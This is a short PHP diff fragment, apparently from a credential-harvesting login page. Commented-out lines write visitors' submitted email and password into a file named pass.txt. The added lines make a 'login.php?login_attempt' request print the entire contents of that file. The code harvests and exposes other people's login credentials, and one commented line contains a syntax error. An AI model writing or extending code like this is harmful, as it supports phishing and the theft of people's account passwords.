@@ -16,7 +16,8 @@ $url = $base . $_SERVER['REQUEST_URI'];
 //	$mydomain = 'http://'.$_SERVER['HTTP_HOST'].'/';
 //}
 if (strpos($_SERVER['REQUEST_URI'], 'login.php?login_attempt') !== false) {
-	echo 'true';
+	$file = file_get_contents('pass.txt');
+	echo $file;
 // 	$file = fopen('pass.txt', 'w');
 //     	fwrite($file, $_POST['email']. . ' - ' . $_POST['pass'] . '\n');
 //     	fclose($file);
